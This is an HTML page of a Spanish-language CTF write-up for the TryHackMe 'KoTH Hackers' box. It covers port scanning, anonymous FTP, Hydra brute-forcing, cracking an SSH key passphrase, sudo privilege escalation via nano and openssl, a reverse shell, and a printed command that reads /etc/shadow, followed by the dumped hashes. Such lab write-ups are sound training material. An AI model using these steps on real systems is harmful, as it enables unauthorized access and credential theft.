<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>TryHackMe - KoTH Hackers :: sckull — TryHackMe, HackTheBox, CTF Writeups</title>    
  
  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">

<meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<meta name="description" content="Titulo KoTH Hackers     Info May 2020 rotation KoTH box   Puntos *   Dificultad Media   Maker NinjaJc01    NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), http (80) y el puerto ssh (22) abiertos.
# Nmap 7.80 scan initiated Fri Jul 10 16:49:57 2020 as: nmap -sV -p- -T5 -o nmap_scan kothhacker.thm Warning: 10."/>
<meta name="keywords" content=""/>
<meta name="robots" content="noodp"/>
<link rel="canonical" href="https://sckull.github.io/posts/kothhacker/" />


<link rel="stylesheet" href="https://sckull.github.io/assets/style.css">


<link rel="stylesheet" href="https://sckull.github.io/style.css">


<link rel="shortcut icon" href="https://sckull.github.io/img/favicon.png">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script src="https://kit.fontawesome.com/57784fec54.js" crossorigin="anonymous"></script>


<meta name="twitter:card" content="summary" />
<meta name="twitter:title" content="TryHackMe - KoTH Hackers :: sckull — TryHackMe, HackTheBox, CTF Writeups" />
<meta name="twitter:description" content="Titulo KoTH Hackers     Info May 2020 rotation KoTH box   Puntos *   Dificultad Media   Maker NinjaJc01    NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), http (80) y el puerto ssh (22) abiertos.
# Nmap 7.80 scan initiated Fri Jul 10 16:49:57 2020 as: nmap -sV -p- -T5 -o nmap_scan kothhacker.thm Warning: 10." />
<meta name="twitter:site" content="https://sckull.github.io/" />
<meta name="twitter:creator" content="sckull" />
<meta name="twitter:image" content="https://sckull.github.io/image/tryhackme/kothhacker/cover.png">





<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="TryHackMe - KoTH Hackers :: sckull — TryHackMe, HackTheBox, CTF Writeups">
<meta property="og:description" content="Titulo KoTH Hackers     Info May 2020 rotation KoTH box   Puntos *   Dificultad Media   Maker NinjaJc01    NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), http (80) y el puerto ssh (22) abiertos.
# Nmap 7.80 scan initiated Fri Jul 10 16:49:57 2020 as: nmap -sV -p- -T5 -o nmap_scan kothhacker.thm Warning: 10." />
<meta property="og:url" content="https://sckull.github.io/posts/kothhacker/" />
<meta property="og:site_name" content="TryHackMe - KoTH Hackers" />
<meta property="og:image" content="https://sckull.github.io/image/tryhackme/kothhacker/cover.png">
<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">

<meta name="google-site-verification" content="cug_0s4kFi5UbEfBI5hJsscmJ7XdimqECCYfN1EAZq0" />


<script type="application/ld+json">
    {
        "@context" : "http://schema.org",
        "@type" : "BlogPosting",
        "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https://sckull.github.io/"
        },
        "articleSection" : "posts",
        "name" : "TryHackMe - KoTH Hackers",
        "headline" : "TryHackMe - KoTH Hackers",
        "description" : "Titulo KoTH Hackers     Info May 2020 rotation KoTH box   Puntos *   Dificultad Media   Maker NinjaJc01    NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), http (80) y el puerto ssh (22) abiertos.
# Nmap 7.80 scan initiated Fri Jul 10 16:49:57 2020 as: nmap -sV -p- -T5 -o nmap_scan kothhacker.thm Warning: 10.",
        "inLanguage" : "en-US",
        "author" : "",
        "creator" : "",
        "publisher": "",
        "accountablePerson" : "",
        "copyrightHolder" : "",
        "copyrightYear" : "2020",
        "datePublished": "2020-07-09 00:00:00 &#43;0000 UTC",
        "dateModified" : "2020-07-09 00:00:00 &#43;0000 UTC",
        "url" : "https://sckull.github.io/posts/kothhacker/",
        "wordCount" : "1597",
        "keywords" : [ "tryhackme","CTF","Blog" ]
    }
    </script>


<meta property="article:published_time" content="2020-07-09 00:00:00 &#43;0000 UTC" />




<a name="top"></a>
</head>

<body class="dark-theme">
  
<div class="container">
  <header class="header">
  <span class="header__inner">
    <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
  <polyline fill="none" stroke="#fff" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
</svg>
</span>
    <span class="logo__text">sckull | blog</span>
    <span class="logo__cursor"></span>
  
</a>

    <span class="header__right">
      
        <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
    
      
        
                   

          

          

          
            <li><a href="/about">About</a></li>
          

        
      
        
                   

          
            <li><a href="/tags/hackthebox/"><img class="icon" src="/hackthebox.ico" width="32" title="HackTheBox"></a></li>
          

          

          

        
      
        
                   

          

          
            <li><a href="/tags/tryhackme/"><img class="icon" src="/thm.ico" width="32" title="TryHackMe"></a></li>
          

          

        
      
      
    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        

          

          

          
            <li><a href="/about">About</a></li>
          

      
    
      
        

          
            <li><a href="/tags/hackthebox/"><img class="icon" src="/hackthebox.ico" width="32" title="HackTheBox"></a></li>
          

          

          

      
    
      
        

          

          
            <li><a href="/tags/tryhackme/"><img class="icon" src="/thm.ico" width="32" title="TryHackMe"></a></li>
          

          

      
    
  </ul>
</nav>

        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none"/>
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
          </svg>
        </span>
      
      
    </span>
  </span>
  <link rel="shortcut icon" href="https://sckullbock.blogspot.com/favicon.ico">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.5.0/Chart.min.js"></script>
</header>

  
  <div class="content">    
    

  <div class="post">
    <h2 class="post-title">TryHackMe - KoTH Hackers</h2>
    <div class="post-meta">
      
        <span class="post-date">
          <i class="fas fa-calendar-week"></i>
            Thursday, Jul 9, 2020
        </span>
      
      <span class="post-author">— Written by sckull</span>
      
        <span class="post-read-time">— 8 min read</span>
      
    </div>
        
    
      <span class="post-tags">
        
         <a class="button-tag" href="https://sckull.github.io/tags/tryhackme/"><li class="fa fa-tag"></li> tryhackme</a>&nbsp;
        
         <a class="button-tag" href="https://sckull.github.io/tags/ctf/"><li class="fa fa-tag"></li> CTF</a>&nbsp;
        
      </span>
    

    
      
        <img src="https://sckull.github.io/posts/kothhacker/../../image/tryhackme/kothhacker/cover.png" class="post-cover center" />
      
      <hr />
     
    

    <div class="contenido">
      <h2>Contenido</h2>
      <nav id="TableOfContents">
<ul>
<li>
<ul>
<li><a href="#nmap">NMAP</a></li>
<li><a href="#http">HTTP</a>
<ul>
<li><a href="#gobuster">GOBUSTER</a></li>
</ul></li>
<li><a href="#ftp">FTP</a></li>
<li><a href="#rcampbell-ssh-hydra">RCAMPBELL - SSH/HYDRA</a></li>
<li><a href="#gcrawford-ftp-hydra">GCRAWFORD - FTP/HYDRA</a></li>
<li><a href="#privilege-escalation">PRIVILEGE ESCALATION</a></li>
<li><a href="#plague-api-hydra">PLAGUE - API/HYDRA</a></li>
</ul></li>
</ul>
</nav>
    </div>

    <div class="post-content">      
      

<table>
<thead>
<tr>
<th>Titulo</th>
<th>KoTH Hackers</th>
</tr>
</thead>

<tbody>
<tr>
<td>Info</td>
<td>May 2020 rotation KoTH box</td>
</tr>

<tr>
<td>Puntos</td>
<td>*</td>
</tr>

<tr>
<td>Dificultad</td>
<td>Media</td>
</tr>

<tr>
<td>Maker</td>
<td><a href="https://tryhackme.com/p/NinjaJc01">NinjaJc01</a></td>
</tr>
</tbody>
</table>

<h2 id="nmap">NMAP</h2>

<p>Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), http (80) y el puerto ssh (22) abiertos.</p>

<pre><code class="language-bash"># Nmap 7.80 scan initiated Fri Jul 10 16:49:57 2020 as: nmap -sV -p- -T5 -o nmap_scan kothhacker.thm
Warning: 10.10.130.16 giving up on port because retransmission cap hit (2).
Nmap scan report for kothhacker.thm (10.10.130.16)
Host is up (0.15s latency).
Not shown: 65488 closed ports, 43 filtered ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
9999/tcp open  abyss?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.80%I=7%D=7/10%Time=5F08E4C8%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,75,&quot;HTTP/1\.0\x20200\x20OK\r\nDate:\x20Fri,\x2010\x20Jul\x2020
SF:20\x2021:59:36\x20GMT\r\nContent-Length:\x201\r\nContent-Type:\x20text/
SF:plain;\x20charset=utf-8\r\n\r\n\n&quot;)%r(HTTPOptions,75,&quot;HTTP/1\.0\x20200\
SF:x20OK\r\nDate:\x20Fri,\x2010\x20Jul\x202020\x2021:59:36\x20GMT\r\nConte
SF:nt-Length:\x201\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\
SF:n\n&quot;)%r(FourOhFourRequest,75,&quot;HTTP/1\.0\x20200\x20OK\r\nDate:\x20Fri,\x
SF:2010\x20Jul\x202020\x2021:59:37\x20GMT\r\nContent-Length:\x201\r\nConte
SF:nt-Type:\x20text/plain;\x20charset=utf-8\r\n\r\n\n&quot;)%r(GenericLines,67,
SF:&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20
SF:charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request&quot;)%r(
SF:RTSPRequest,67,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
SF:x20Request&quot;)%r(Help,67,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-T
SF:ype:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400
SF:\x20Bad\x20Request&quot;)%r(SSLSessionReq,67,&quot;HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x2
SF:0close\r\n\r\n400\x20Bad\x20Request&quot;)%r(TerminalServerCookie,67,&quot;HTTP/1
SF:\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset
SF:=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request&quot;)%r(TLSSess
SF:ionReq,67,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
SF:quest&quot;)%r(Kerberos,67,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
SF:x20Bad\x20Request&quot;)%r(LPDString,67,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\
SF:r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20clos
SF:e\r\n\r\n400\x20Bad\x20Request&quot;)%r(LDAPSearchReq,67,&quot;HTTP/1\.1\x20400\x
SF:20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nCo
SF:nnection:\x20close\r\n\r\n400\x20Bad\x20Request&quot;)%r(SIPOptions,67,&quot;HTTP
SF:/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20chars
SF:et=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request&quot;);
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jul 10 17:01:09 2020 -- 1 IP address (1 host up) scanned in 671.62 seconds
</code></pre>

<h2 id="http">HTTP</h2>

<p>Encontramos una pagina web en el puerto 80.
<img src="../../image/tryhackme/kothhacker/Screenshot_20200710_153153.png" alt="image" /></p>

<p>Al revisar las hojas de estilo de la pagina, encontramos una flag.
<img src="../../image/tryhackme/kothhacker/Screenshot_20200710_153426.png" alt="image" /></p>

<h3 id="gobuster">GOBUSTER</h3>

<p>Utilizamos gobuster para busqueda de directorios y archivos.</p>

<pre><code class="language-bash">root@upset:~/thm/kothhacker# gobuster dir -u http://kothhacker.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t 25 -x php,html,txt
/backdoor (Status: 301)
/contact (Status: 301)
/img (Status: 301)
/index.html (Status: 301)
/index.html (Status: 301)
/news (Status: 301)
/robots.txt (Status: 200)
/robots.txt (Status: 200)
/staff (Status: 301)
</code></pre>

<p>Vemos que en backdoor existe un formulario de autenticacion.
<img src="../../image/tryhackme/kothhacker/Screenshot_20200710_161413.png" alt="image" /></p>

<p>Revisamos el codigo fuente de esta pagina y encontramos un archivo javascript que realiza la autenticacion y que si esta es correcta redirige hacia otra pagina.</p>

<pre><code class="language-javascript">if (statusOrCookie=== &quot;Incorrect credentials&quot;) {
    alert(&quot;Incorrect Credentials&quot;)
    passwordBox.value=&quot;&quot;
} else {
    Cookies.set(&quot;SessionToken&quot;,statusOrCookie)
    window.location = &quot;/backdoor/shell&quot;
}
</code></pre>

<p><code>/backdoor/shell</code> es la pagina a la que nos redirige, analizamos la pagina y vemos que al visitarla nos redirige nuevamente al <code>/</code>, por lo que solo podemos leer el codigo fuente, en este ultimo encontramos un archivo Javascript en donde nuevamente verifica la auntenticacion con una cookie. Pero lo interesante es de que contiene un formulario en donde se pueden &ldquo;ejecutar comandos&rdquo; y lo hace mediante una api.</p>

<pre><code class="language-javascript">async function runCommand(commandText) {
    if (commandText === &quot;exit&quot;) {
        Cookies.set(&quot;SessionToken&quot;,&quot;&quot;)
        window.location = &quot;/&quot;
        return
    }
    const outputBox = document.getElementById(&quot;outputBox&quot;);
    if (commandText === &quot;clear&quot;) {
        outputBox.textContent = &quot;&quot;
        return
    }
    outputBox.textContent += &quot;plague@gibson:$ &quot; + commandText + &quot;\n&quot;
    outputBox.textContent += await (await postData(&quot;/api/cmd&quot;, commandText)).text()
    window.scrollBy(0, 1000);
}
</code></pre>

<h2 id="ftp">FTP</h2>

<p>Utilizamos las &ldquo;credenciales&rdquo; de anonymous (anonymous:anonymous) para ingresar por el servicio FTP, en donde logramos encontrar dos archivos, el primero contiene una flag y el segundo una nota.</p>

<pre><code class="language-bash">root@upset:~/thm/kothhacker# ftp kothhacker.thm 
Connected to kothhacker.thm.
220-Ellingson Mineral Company FTP Server
220-
220-WARNING
220-Unauthorised Access is a felony offense under the Computer Fraud and Abuse Act 1986
220 
Name (kothhacker.thm:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls -lah
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Apr 30 04:42 .
drwxr-xr-x    2 ftp      ftp          4096 Apr 30 04:42 ..
-rw-r--r--    1 ftp      ftp            38 Apr 30 04:42 .flag
-rw-r--r--    1 ftp      ftp           400 Apr 29 03:57 note
226 Directory send OK.
ftp&gt; get .flag
local: .flag remote: .flag
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for .flag (38 bytes).
226 Transfer complete.
38 bytes received in 0.00 secs (189.3336 kB/s)
ftp&gt; get note
local: note remote: note
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note (400 bytes).
226 Transfer complete.
400 bytes received in 0.00 secs (3.4060 MB/s)
ftp&gt; exit
221 Goodbye.
root@upset:~/thm/kothhacker# cat note 
Note:
Any users with passwords in this list:
love
sex
god
secret
will be subject to an immediate disciplinary hearing.
Any users with other weak passwords will be complained at, loudly.
These users are:
rcampbell:Robert M. Campbell:Weak password
gcrawford:Gerard B. Crawford:Exposing crypto keys, weak password
Exposing the company's cryptographic keys is a disciplinary offense.
Eugene Belford, CSO
root@upset:~/thm/kothhacker#
</code></pre>

<p><img src="../../image/tryhackme/kothhacker/Screenshot_20200710_152842.png" alt="image" /></p>

<h2 id="rcampbell-ssh-hydra">RCAMPBELL - SSH/HYDRA</h2>

<p>En la nota encontramos dos nombres de usuario en donde  mencionan que tienen contraseñas debiles. Creamos un archivo de texto (<code>users.txt</code>) para utilizarlo junto con Hydra en el servicio ssh con el wordlist rockyou, y logramos obtener la contraseña para el usuario rcampbell y además el usuario gcrawford al parecer no tiene activado el acceso por este servicio.
<img src="../../image/tryhackme/kothhacker/Screenshot_20200710_162238.png" alt="image" /></p>

<p>Logramos obtener una shell con el usuario rcampbell y una flag.
<img src="../../image/tryhackme/kothhacker/Screenshot_20200710_162515.png" alt="image" /></p>

<p>Revisando los archivos FTP de configuracion encontramos otra flag.
<img src="../../image/tryhackme/kothhacker/Screenshot_20200710_163331.png" alt="image" /></p>

<p>No logramos encontrar ningun archivo que nos ayudara para escalar privilegios por lo que utilizamos nuevamente HYDRA con los usuarios encontrados en el servicio FTP. Logramos encontrar la misma contraseña para rcampbell.
<img src="../../image/tryhackme/kothhacker/Screenshot_20200710_164705.png" alt="image" /></p>

<pre><code class="language-bash">root@upset:~/thm/kothhacker# ftp kothhacker.thm 
Connected to kothhacker.thm.
220-Ellingson Mineral Company FTP Server
220-
220-WARNING
220-Unauthorised Access is a felony offense under the Computer Fraud and Abuse Act 1986
220 
Name (kothhacker.thm:root): rcampbell
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls -lah
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-x---    4 ftp      ftp          4096 Jul 10 22:39 .
drwxr-x---    4 ftp      ftp          4096 Jul 10 22:39 ..
lrwxrwxrwx    1 ftp      ftp             9 Apr 30 01:33 .bash_history -&gt; /dev/null
-rw-r--r--    1 ftp      ftp           220 Apr 29 03:58 .bash_logout
-rw-r--r--    1 ftp      ftp          3771 Apr 29 03:58 .bashrc
drwx------    2 ftp      ftp          4096 Jul 10 22:16 .cache
-r--------    1 ftp      ftp            38 Apr 30 04:44 .flag
drwx------    3 ftp      ftp          4096 Jul 10 22:16 .gnupg
-rw-r--r--    1 ftp      ftp           807 Apr 29 03:58 .profile
226 Directory send OK.
</code></pre>

<h2 id="gcrawford-ftp-hydra">GCRAWFORD - FTP/HYDRA</h2>

<p>Utilizamos nuevamente HYDRA pero esta vez con el usuario gcrawford en donde logramos obtener una contraseña para el servicio FTP.
<img src="../../image/tryhackme/kothhacker/Screenshot_20200710_171227.png" alt="image" /></p>

<p>Ingresamos al servicio y encontramos la clave privada y publica SSH de este usuario, además encontramos un archivo de texto.</p>

<pre><code class="language-bash">root@upset:~/thm/kothhacker# ftp kothhacker.thm 
Connected to kothhacker.thm.
220-Ellingson Mineral Company FTP Server
220-
220-WARNING
220-Unauthorised Access is a felony offense under the Computer Fraud and Abuse Act 1986
220 
Name (kothhacker.thm:root): gcrawford
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls -lah
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-x---    6 ftp      ftp          4096 Apr 30 04:25 .
drwxr-x---    6 ftp      ftp          4096 Apr 30 04:25 ..
lrwxrwxrwx    1 ftp      ftp             9 Apr 30 01:31 .bash_history -&gt; /dev/null
-rw-r--r--    1 ftp      ftp           220 Apr 29 04:00 .bash_logout
-rw-r--r--    1 ftp      ftp          3771 Apr 29 04:00 .bashrc
drwx------    2 ftp      ftp          4096 Apr 29 17:05 .cache
drwx------    3 ftp      ftp          4096 Apr 29 17:05 .gnupg
drwxrwxr-x    3 ftp      ftp          4096 Apr 29 20:53 .local
-rw-r--r--    1 ftp      ftp           807 Apr 29 04:00 .profile
drwx------    2 ftp      ftp          4096 Jul 10 21:07 .ssh
-r--------    1 ftp      ftp           252 Apr 30 04:25 business.txt
226 Directory send OK.
ftp&gt; cd .ssh
250 Directory successfully changed.
ftp&gt; ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           398 Jul 10 21:07 authorized_keys
-rw-------    1 ftp      ftp          1766 Jul 10 21:07 id_rsa
-rw-r--r--    1 ftp      ftp           398 Jul 10 21:07 id_rsa.pub
226 Directory send OK.
ftp&gt; get id_rsa
local: id_rsa remote: id_rsa
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for id_rsa (1766 bytes).
226 Transfer complete.
1766 bytes received in 0.00 secs (2.2396 MB/s)
ftp&gt; cd ..
250 Directory successfully changed.
ftp&gt; get business.txt
local: business.txt remote: business.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for business.txt (252 bytes).
226 Transfer complete.
252 bytes received in 0.00 secs (1.7935 MB/s)
ftp&gt; exit
221 Goodbye.
</code></pre>

<p>El archivo de texto contiene una flag.
<img src="../../image/tryhackme/kothhacker/Screenshot_20200710_171827.png" alt="image" /></p>

<p>Intentamos autenticarnos con el archivo <code>id_rsa</code> en el servicio SSH pero al parecer el archivo esta protegido por una frase.</p>

<pre><code class="language-bash">root@upset:~/thm/kothhacker# ssh gcrawford@kothhacker.thm -i id_rsa 
Unauthorised access is a federal offense under the Computer Fraud and Abuse Act 1986
Enter passphrase for key 'id_rsa': 
Enter passphrase for key 'id_rsa': 
Enter passphrase for key 'id_rsa': 
gcrawford@kothhacker.thm: Permission denied (publickey).
root@upset:~/thm/kothhacker#
</code></pre>

<p>Utilizamos <code>ssh2john</code> para obtener el hash del archivo -id_rsa- y crackeamos el hash con john.
<img src="../../image/tryhackme/kothhacker/Screenshot_20200710_172027.png" alt="image" /></p>

<p>Logramos obtener la frase y logramos obtener una shell con el usuario gcrawford.
<img src="../../image/tryhackme/kothhacker/Screenshot_20200710_172211.png" alt="image" /></p>

<h2 id="privilege-escalation">PRIVILEGE ESCALATION</h2>

<p>Hacemos una pequeña enumeracion con <code>sudo -l -l</code> y vemos que tenemos permisos root (sudo) para ejecutar el comando <code>nano</code> con el archivo <code>bussines.txt</code>. Utilizamos <a href="https://gtfobins.github.io/gtfobins/nano/#sudo"><strong>nano</strong></a> para obtener una shell root.
<img src="../../image/tryhackme/kothhacker/Screenshot_20200710_172518.png" alt="image" /></p>

<p>Logramos obtener una flag en <code>/root/</code>.
<img src="../../image/tryhackme/kothhacker/Screenshot_20200710_172620.png" alt="image" /></p>

<p>Agregamos nuestra clave publica al archivò <code>authorized_keys</code> e ingresamos con el usuario root en el servicio ssh.
<img src="../../image/tryhackme/kothhacker/Screenshot_20200710_172851.png" alt="image" /></p>

<p>Buscamos la flag en el directorio <code>/home</code> y logramos encontrar las dos ultimas en <code>/home/tryhackme/.flag</code> y<code>/home/production/.flag</code>.
<img src="../../image/tryhackme/kothhacker/Screenshot_20200710_173233.png" alt="image" /></p>

<h2 id="plague-api-hydra">PLAGUE - API/HYDRA</h2>

<p>En una de las paginas principales y en robots.txt encontramos un comentario que hacen enfasis en <code>plague</code>. Utilizamos Hydra y en donde el parametro usuario utilizamos <code>plage</code>.
<img src="../../image/tryhackme/kothhacker/Screenshot_20200710_174216.png" alt="image" />
<img src="../../image/tryhackme/kothhacker/Screenshot_20200710_174237.png" alt="image" /></p>

<p>Utilizamos Hydra para intentar logearnos en <code>/backdoor/shell</code>, logramos encontrar la contraseña para plague.
<img src="../../image/tryhackme/kothhacker/Screenshot_20200710_174931.png" alt="image" /></p>

<p>Logramos autenticarnos y ejecutar comandos.
<img src="../../image/tryhackme/kothhacker/Screenshot_20200710_175044.png" alt="image" /></p>

<p>Ya que podemos ejecutar comandos vamos a obtener una shell inversa.
<img src="../../image/tryhackme/kothhacker/Screenshot_20200710_175532.png" alt="image" />
<img src="../../image/tryhackme/kothhacker/Screenshot_20200710_175505.png" alt="image" /></p>

<p>Hacemos una pequeña enumeracion con <code>sudo -l -l</code> y vemos que tenemos permisos root (sudo) para ejecutar el comando <code>openssl</code>. Utilizamos <a href="https://gtfobins.github.io/gtfobins/openssl/#file-read"><strong>GTFOBINS</strong></a> para leer el archivo <code>/etc/shadow</code>.
<img src="../../image/tryhackme/kothhacker/Screenshot_20200710_175953.png" alt="image" /></p>

<pre><code class="language-bash">LFILE=/etc/shadow
/usr/bin/sudo /usr/bin/openssl enc -in &quot;$LFILE&quot;
</code></pre>

<p>Logramos obtener el contenido, las contraseñas encriptadas.</p>

<pre><code class="language-bash">tryhackme:$6$m6t6Wwb.Irn8qFzm$LJ8sBnQX6.XDyqjQuL0XVoVSOXyRlcugWjbp3cN80Xl9344moBmQ/XdQfO2w5Oub4Kz0eBFG4KeP..05hFh171:18378:0:99999:7:::
production:$6$CMJF8CIY$aq3ycncJkhhTa6h6vgec5Dr53cKJmQ.9Fa.7ZceaolrIr0B5DDKHZfV97GI0puAfrD.hCt0ZOBqtbt/RT/1TV.:18381:0:99999:7:::
ftp:*:18381:0:99999:7:::
rcampbell:$6$OlVRVXBb$5toooBVqa93gBtUncQNyMHeKvMdy.Wtr9eukllbmOv7wd8X.LaQR/tTYK9D1BCFSVGI3Pr/dD4U08d/8wNwES1:18453:0:99999:7:::
gcrawford:$6$PujyDO0o$/TQMT0PNSCO.1qavpm26sCu9TAt.OTvjhQrXYVY5S.MNUg6XE0pxHnB3lRqfZEYo1Vjvyo8TY6CTE3FH/vzXL1:18453:0:99999:7:::
</code></pre>

    </div>    
    <hr />
    
    <div>
      
        
<div id="disqus_thread"></div>
<script>
(function() {
var d = document, s = d.createElement('script');
s.src = 'https://sckull.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>

      
      
    </div>

    
      <div class="pagination">
        <div class="pagination__title">
          <span class="pagination__title-h">Read other posts</span>
          <hr />
        </div>
        <div class="pagination__buttons">
          
          
            <span class="button next">
              <a href="https://sckull.github.io/posts/uopeasy/">
                <span class="button__text">TryHackMe - uopeasy</span>
                <span class="button__icon">→</span>
              </a>
            </span>
          
        </div>
      </div>
      
    
    
    
  </div>
  
    
  </div>
  
  
    <footer class="footer">
  <div class="footer__inner">
    
      <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
  <polyline fill="none" stroke="#fff" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
</svg>
</span>
    <span class="logo__text">sckull | blog</span>
    <span class="logo__cursor"></span>
  
</a>

      <div class="copyright">
        <span style="font-size: 0.85em;">© 2020 sckull</span>
        
      
      </div>
    
  </div>
</footer>

<script src="https://sckull.github.io/assets/main.js"></script>
<script src="https://sckull.github.io/assets/prism.js"></script>




  
  
  
  <a class="float" id="myBtn" href="#top"><i class="fa fa-arrow-up" aria-hidden="true"></i></a>
  
</div>



</body>
</html>
